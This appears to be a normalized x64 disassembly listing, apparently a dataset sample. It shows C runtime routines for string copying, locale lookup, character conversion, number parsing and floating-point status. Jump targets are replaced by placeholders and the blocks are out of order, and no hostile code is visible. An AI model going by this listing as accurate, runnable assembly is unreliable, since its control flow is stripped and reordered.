jne r-xdata
cmp al 0x39
jg r-xdata
mov rax [ rsi + 0x128 ]
mov rcx [ rax ]
mov [ r12 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x8 ]
mov [ r12 + 0x8 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x10 ]
mov [ r12 + 0x10 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x58 ]
mov [ r12 + 0x58 ] rcx
mov rax [ rsi + 0x128 ]
mov rcx [ rax + 0x60 ]
mov [ r12 + 0x60 ] rcx
mov [ r14 ] 0x1
test r13 r13
je r-xdata
inc rdx
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
test al al
jne r-xdata
jmp r-xdata
sub_1400489c4
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_14003f1a4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10b
je r-xdata
mov [ rcx ] r10b
test rdx rdx
jne r-xdata
inc rcx
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10b
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10b
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ rcx + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_140043760
mov eax ebx
sub_140048a40
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_14003f1a4
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bl
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bl
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bl
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
mov al [ r10 ]
mov [ r11 + r10 ] al
inc r10
test al al
je r-xdata
jmp r-xdata
mov al [ r10 + r11 ]
mov [ r11 ] al
inc r11
test al al
je r-xdata
mov [ rcx ] bl
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] bl
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
sub_140048b00
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
xor ebx ebx
mov r13 r8
mov edi edx
mov r14 rcx
mov eax 0x1
mov esi ebx
test edx edx
js r-xdata
test eax eax
test eax eax
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
sete bl
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov rcx [ r13 ]
lea eax [ rsi + rdi ]
cdq
sub eax edx
sar eax 0x1
movsxd rbp eax
mov r12 rbp
add r12 r12
mov rdx [ r14 + r12 * 8 ]
call sub_1400516bc
test eax eax
jne r-xdata
jns r-xdata
lea rcx [ r14 + r12 * 8 + 0x8 ]
mov [ r13 ] rcx
jmp r-xdata
lea esi [ rbp + 0x1 ]
lea edi [ rbp - 0x1 ]
jmp r-xdata
cmp esi edi
jle r-xdata
sub_140048b98
mov dl [ rcx ]
mov r8 rcx
xor r9d r9d
jmp r-xdata
test dl dl
jne r-xdata
lea eax [ rdx - 0x61 ]
inc r8
cmp al 0x5
ja r-xdata
mov eax r9d
retn
lea eax [ rdx - 0x41 ]
cmp al 0x5
ja r-xdata
add dl 0xd9
jmp r-xdata
movsx ecx dl
mov dl [ r8 ]
add r9d r9d
lea r9d [ rcx + r9 * 8 - 0x30 ]
add dl 0xf9
sub_140048bd4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbx rcx
call sub_140043c34
mov rcx rbx
mov rdi rax
call sub_140048b98
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov esi eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x20 ]
call sub_1400516bc
test eax eax
jne r-xdata
mov [ rdi + 0x150 ] ebx
lea eax [ rbx + 0x1 ]
jmp r-xdata
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
lea rax [ r--data ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc ebx
add rax 0x2
cmp ebx 0xa
jb r-xdata
cmp si [ rax ]
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x164 ] esi
mov [ rdi + 0x160 ] esi
sub_140048cbc
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
sub rsp 0x20
mov edi ecx
mov rbp r8
and ecx 0x3ff
mov esi edx
lea r8 [ rax + 0x8 ]
mov r9d 0x2
bts ecx 0xa
mov edx 0x20000001
call [ GetLocaleInfoW@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
cmp edi [ rsp + 0x30 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbp ]
sub al 0x61
cmp al 0x19
ja r-xdata
cmp al 0x5a
jle r-xdata
mov rcx [ rbp ]
call sub_14003f7f0
cmp ebx eax
je r-xdata
inc ebx
jmp r-xdata
mov al [ rcx ]
inc rcx
cmp al 0x41
jl r-xdata
sub_140048d4c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
call sub_140043c34
mov rcx rbx
mov rdi rax
call sub_140048b98
mov ecx [ rdi + 0x15c ]
neg ecx
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff005
add edx 0x1002
call [ GetLocaleInfoA@IAT ]
xor ebp ebp
test eax eax
jne r-xdata
mov rcx [ rdi + 0x148 ]
lea rdx [ rsp + 0x30 ]
call sub_1400516bc
test eax eax
jne r-xdata
mov [ rdi + 0x150 ] ebp
mov eax 0x1
jmp r-xdata
mov eax [ rdi + 0x150 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
mov eax [ rdi + 0x158 ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
neg eax
mov ecx ebx
sbb edx edx
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_1400516bc
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_1400516bc
test eax eax
jne r-xdata
test [ rdi + 0x150 ] 0x2
jne r-xdata
or [ rdi + 0x150 ] 0x304
mov [ rdi + 0x160 ] ebx
jmp r-xdata
cmp [ rdi + 0x158 ] ebp
jne r-xdata
bts [ rdi + 0x150 ] 0x9
mov eax [ rdi + 0x150 ]
cmp [ rdi + 0x158 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
mov [ rdi + 0x164 ] ebx
cmp [ rdi + 0x154 ] ebp
je r-xdata
cmp [ rdi + 0x154 ] ebp
je r-xdata
bts eax 0x8
mov [ rdi + 0x150 ] eax
jmp r-xdata
mov eax [ rdi + 0x150 ]
test al 0x1
jne r-xdata
movsxd r8 [ rdi + 0x154 ]
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_14005185c
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_1400516bc
test eax eax
jne r-xdata
bts [ rdi + 0x150 ] 0x8
mov rcx [ rdi + 0x140 ]
call sub_14003f7f0
cmp eax [ rdi + 0x154 ]
jne r-xdata
cmp [ rdi + 0x160 ] ebp
jne r-xdata
mov edx ebp
lea rcx [ r--data ]
mov rcx [ rdi + 0x140 ]
or [ rdi + 0x150 ] 0x2
mov [ rdi + 0x164 ] ebx
call sub_14003f7f0
cmp eax [ rdi + 0x154 ]
jne r-xdata
mov ecx ebx
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x20 ]
and ecx 0x3ff
mov edx 0x20000001
bts ecx 0xa
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
lea r8 [ rdi + 0x140 ]
mov edx 0x1
mov ecx ebx
call sub_140048cbc
test eax eax
je r-xdata
inc edx
add rcx 0x2
cmp edx 0xa
jb r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
mov eax [ rdi + 0x160 ]
bts [ rdi + 0x150 ] 0x8
test eax eax
cmove eax ebx
mov [ rdi + 0x160 ] eax
cmp bx [ rcx ]
je r-xdata
or eax 0x1
mov [ rdi + 0x150 ] eax
sub_14004901c
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
call sub_140043c34
mov rcx rbx
mov rdi rax
call sub_140048b98
mov ecx [ rdi + 0x158 ]
neg ecx
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_1400516bc
test eax eax
jne r-xdata
and [ rdi + 0x150 ] eax
mov eax 0x1
jmp r-xdata
cmp [ rdi + 0x158 ] 0x0
jne r-xdata
cmp [ rdi + 0x158 ] eax
jne r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xd8 ]
add rsp 0xc0
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ rdi + 0x154 ] 0x0
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x160 ] ebx
mov [ rdi + 0x164 ] ebx
lea r8 [ rdi + 0x140 ]
lea edx [ rax + 0x1 ]
mov ecx ebx
call sub_140048cbc
jmp r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_1400516bc
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov ecx ebx
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x20 ]
and ecx 0x3ff
mov edx 0x20000001
bts ecx 0xa
call [ GetLocaleInfoW@IAT ]
sub_14004914c
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_14003f7f0
mov rcx [ rbx + 0x8 ]
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
call sub_14003f7f0
xor ecx ecx
cmp rax 0x3
sete cl
and [ rbx + 0x20 ] 0x0
cmp [ rbx + 0x18 ] 0x0
mov [ rbx + 0x1c ] ecx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
and [ rbx + 0x10 ] 0x0
test [ rbx + 0x10 ] 0x200
je r-xdata
mov [ rbx + 0x14 ] edx
lea rcx [ sub_140048d4c ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x100
je r-xdata
inc edx
jmp r-xdata
test [ rbx + 0x10 ] 0x7
jne r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
sub_1400491e4
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_14003f7f0
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
test edx edx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
add rsp 0x20
pop rbx
retn
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x14 ] edx
lea rcx [ sub_14004901c ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
inc edx
jmp r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
sub_140049250
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x30
mov r12 r8
mov rbp rdx
mov rsi rcx
call sub_140043c34
lea rbx [ rax + 0x140 ]
test rsi rsi
jne r-xdata
lea rax [ rsi + 0x40 ]
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
or [ rbx + 0x10 ] 0x104
jmp r-xdata
mov rax [ rbx ]
and [ rbx + 0x10 ] 0x0
test rax rax
je r-xdata
cmp [ rax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ rbx + 0x20 ] eax
mov [ rbx + 0x24 ] eax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rax ] 0x0
je r-xdata
lea r8 [ rbx + 0x8 ]
lea rcx [ r--data ]
mov edx 0x16
call sub_140048b00
xor eax eax
lea rax [ rsi + 0x80 ]
neg rsi
sbb rdi rdi
and rdi rax
je r-xdata
mov [ rbx + 0x10 ] 0x104
cmp [ rcx ] 0x0
je r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ rsp + 0x50 ]
mov r9d 0x2
mov edx 0x20001004
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
cmp [ rdi ] 0x0
je r-xdata
call sub_14003f7f0
xor ecx ecx
mov edx 0x1
cmp rax 0x3
sete cl
mov [ rbx + 0x1c ] ecx
lea rcx [ sub_140048bd4 ]
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
mov rcx rbx
call sub_1400491e4
cmp [ rax ] 0x0
je r-xdata
mov edi [ rsp + 0x50 ]
test edi edi
jne r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_14003e9f0
test eax eax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
je r-xdata
and [ rbx + 0x10 ] 0x0
jmp r-xdata
lea rcx [ r--data ]
mov r8 rbx
mov edx 0x40
call sub_140048b00
test eax eax
je r-xdata
mov rcx rbx
call sub_14004914c
jmp r-xdata
cmp edi 0xfde8
je r-xdata
call [ GetACP@IAT ]
lea rdx [ r--data ]
mov rcx rdi
call sub_14003e9f0
test eax eax
jne r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
cmp edi 0xfde9
je r-xdata
mov rcx rdi
call sub_140051704
jmp r-xdata
mov ecx [ rbx + 0x24 ]
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x2000000b
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call sub_1400491e4
jmp r-xdata
cmp [ rax ] 0x0
je r-xdata
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi eax
mov edi [ rsp + 0x50 ]
jmp r-xdata
mov rcx rbx
call sub_14004914c
jmp r-xdata
mov ecx [ rbx + 0x20 ]
mov edx 0x1
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test rbp rbp
je r-xdata
test r12 r12
je r-xdata
movzx eax [ rbx + 0x20 ]
mov [ rbp ] ax
movzx eax [ rbx + 0x24 ]
mov [ rbp + 0x4 ] di
mov [ rbp + 0x2 ] ax
mov eax 0x1
jmp r-xdata
mov eax 0x814
cmp [ rbp ] ax
jne r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov ecx [ rbx + 0x20 ]
mov r9d 0x40
mov r8 r12
mov edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
lea r8 [ r--data ]
mov edx 0x40
mov rcx r12
call sub_140042dcc
test eax eax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ r12 + 0x40 ]
mov edx 0x1002
mov r9d 0x40
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov r9d 0xa
lea rdx [ r12 + 0x80 ]
mov ecx edi
lea r8d [ r9 + 0x6 ]
call sub_140041550
sub_140049530
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_14003a6a0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_14003d760
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_14003ae78
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_14003ad04
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14003d700
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_140049690
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_14003b928
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_140049530
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140049720
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_1400497d8
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r11d r11d
mov r10 rdx
mov [ rsp ] r11
mov [ rsp + 0x8 ] r11
mov [ rsp + 0x10 ] r11
mov [ rsp + 0x18 ] r11
mov r9 rcx
jmp r-xdata
test al al
jne r-xdata
movzx r8d al
movzx eax al
mov edx 0x1
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r10
mov al [ r10 ]
jmp r-xdata
mov r8b [ r9 ]
test r8b r8b
jne r-xdata
movzx ecx r8b
movzx eax r8b
mov edx 0x1
and ecx 0x7
shr rax 0x3
shl edx cl
test [ rsp + rax ] dl
jne r-xdata
xor eax eax
mov rax r9
jmp r-xdata
inc r9
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x38
retn
sub_140049874
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov ebp r9d
mov r12d r8d
mov r13 rdx
test rdx rdx
je r-xdata
test rcx rcx
jne r-xdata
mov [ rdx ] rcx
test r8d r8d
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
movzx esi [ rcx ]
xor edi edi
lea rbx [ rcx + 0x2 ]
lea r15d [ rdi + 0x8 ]
jmp r-xdata
cmp r8d 0x2
jl r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov edx r15d
movzx ecx si
call sub_140051540
test eax eax
jne r-xdata
cmp r8d 0x24
jg r-xdata
movzx esi [ rbx ]
add rbx 0x2
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or ebp 0x2
jmp r-xdata
test r12d r12d
jne r-xdata
movzx esi [ rbx ]
add rbx 0x2
cmp r12d 0x10
jne r-xdata
movzx ecx si
call sub_1400518ac
test eax eax
je r-xdata
xor edx edx
or eax 0xffffffff
div r12d
mov r15d eax
mov r14d edx
movzx ecx si
call sub_1400518ac
test eax eax
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
cmp eax r12d
jae r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r12d 0x10
cmp [ rbx ] 0x58
je r-xdata
mov r14 [ rsp + 0x60 ]
sub rbx 0x2
test bpl 0x8
jne r-xdata
or ebp 0x8
cmp edi r15d
jb r-xdata
lea eax [ rsi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ rbx + 0x2 ]
add rbx 0x4
cmp [ rbx ] 0x58
jne r-xdata
mov r12d r15d
jmp r-xdata
mov esi 0x7fffffff
test bpl 0x4
jne r-xdata
test r13 r13
cmovne rbx r14
xor edi edi
jmp r-xdata
imul edi r12d
add edi eax
jne r-xdata
lea eax [ rsi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
test bpl 0x1
je r-xdata
test bpl 0x1
jne r-xdata
test r13 r13
je r-xdata
movzx ecx si
call sub_1400518ac
cmp eax 0xffffffff
jne r-xdata
or ebp 0x4
test r13 r13
jne r-xdata
cmp eax r14d
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
mov al bpl
and al 0x2
neg al
sbb edi edi
neg edi
add edi esi
or edi 0xffffffff
jmp r-xdata
mov eax ebp
and eax 0x2
je r-xdata
test bpl 0x2
je r-xdata
mov [ r13 ] rbx
movzx esi [ rbx ]
add rbx 0x2
jmp r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
mov eax edi
neg edi
cmp edi esi
jbe r-xdata
sub_140049a64
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov [ rax + 0x8 ] rcx
push rbp
mov rbp rsp
sub rsp 0x20
mov rbx rdx
xor edx edx
mov esi r9d
mov [ rcx + 0x4 ] edx
mov rax [ rbp + 0x10 ]
mov [ rax + 0x8 ] edx
mov rax [ rbp + 0x10 ]
mov [ rax + 0xc ] edx
test r8b 0x10
je r-xdata
mov edi [ rbp + 0x40 ]
mov rax [ rbp + 0x10 ]
mov edi 0xc000008f
or [ rax + 0x4 ] 0x1
jmp r-xdata
test r8b 0x1
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc0000093
or [ rax + 0x4 ] 0x2
test r8b 0x2
je r-xdata
test r8b 0x4
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc0000091
or [ rax + 0x4 ] 0x4
test r8b 0x8
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc000008e
or [ rax + 0x4 ] 0x8
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0x7
shl eax 0x4
not eax
xor eax [ rcx + 0x8 ]
and eax 0x10
xor [ rcx + 0x8 ] eax
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0x9
shl eax 0x3
not eax
xor eax [ rcx + 0x8 ]
and eax 0x8
xor [ rcx + 0x8 ] eax
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0xa
shl eax 0x2
not eax
xor eax [ rcx + 0x8 ]
and eax 0x4
xor [ rcx + 0x8 ] eax
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0xb
add eax eax
not eax
xor eax [ rcx + 0x8 ]
and eax 0x2
xor [ rcx + 0x8 ] eax
mov eax [ rbx ]
mov rcx [ rbp + 0x10 ]
shr rax 0xc
not eax
xor eax [ rcx + 0x8 ]
and eax 0x1
xor [ rcx + 0x8 ] eax
call sub_14004a4b8
mov r11 rax
test al 0x1
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc0000090
or [ rax + 0x4 ] 0x10
test al 0x4
je r-xdata
mov rcx [ rbp + 0x10 ]
or [ rcx + 0xc ] 0x10
test al 0x8
je r-xdata
mov rcx [ rbp + 0x10 ]
or [ rcx + 0xc ] 0x8
test r11b 0x10
je r-xdata
mov rax [ rbp + 0x10 ]
or [ rax + 0xc ] 0x4
test r11b 0x20
je r-xdata
mov rax [ rbp + 0x10 ]
or [ rax + 0xc ] 0x2
mov eax [ rbx ]
mov ecx 0x6000
and rax rcx
je r-xdata
mov rax [ rbp + 0x10 ]
or [ rax + 0xc ] 0x1
mov rax [ rbp + 0x10 ]
and [ rax ] 0xfffffffc
cmp rax 0x2000
je r-xdata
mov rcx [ rbp + 0x10 ]
mov r8d 0xffffffe3
mov eax [ rcx + 0x20 ]
and eax r8d
or eax 0x2
mov [ rcx + 0x20 ] eax
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
mov rax [ rbp + 0x10 ]
mov [ rax + 0x10 ] rcx
mov rax [ rbp + 0x10 ]
or [ rax + 0x60 ] 0x1
mov rdx [ rbp + 0x10 ]
mov eax [ rdx + 0x60 ]
and eax r8d
or eax 0x2
mov [ rdx + 0x60 ] eax
mov rax [ rbp + 0x10 ]
mov rdx [ rsi ]
